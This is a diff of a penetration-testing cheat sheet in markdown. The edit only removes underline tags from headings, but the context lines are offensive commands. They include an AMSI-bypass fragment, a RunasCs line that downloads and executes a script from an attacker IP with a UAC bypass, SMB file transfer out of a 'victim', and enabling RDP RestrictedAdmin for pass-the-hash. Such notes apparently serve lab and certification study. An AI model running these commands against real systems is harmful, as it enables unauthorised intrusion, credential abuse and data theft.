@@ -58,19 +58,19 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 
 # Useful Basic Commands
 
-### <ins>Run command as another user</ins>:
+### Run command as another user:
 - `Invoke-RunasCs amit 'Password123!' 'powershell iex(iwr http://192.168.45.185/rev.txt -usebasicparsing)' -ForceProfile -CreateProcessFunction 2 -BypassUac`
 
 - `runas.exe /netonly /user:final.com\nina cmd.exe`
 
-### <ins>Set up SMB server (file transfer)</ins>:
+### Set up SMB server (file transfer):
 - `smbserver.py share $(pwd) -smb2support -username amit -password password` 
 
 - On Victim: `net use \\192.168.45.223\share /U:amit password` 
 
 - Copy files: `copy <FILENAME> \\192.168.45.223\share`
 
-### <ins>Enable RDP and RestrictedAdmin from both Local/Remote</ins>: 
+### Enable RDP and RestrictedAdmin from both Local/Remote: 
 *Note: Enabling RestrictedAdmin allow us to perform PassTheHash with RDP.*
 
 Using command prompt: 
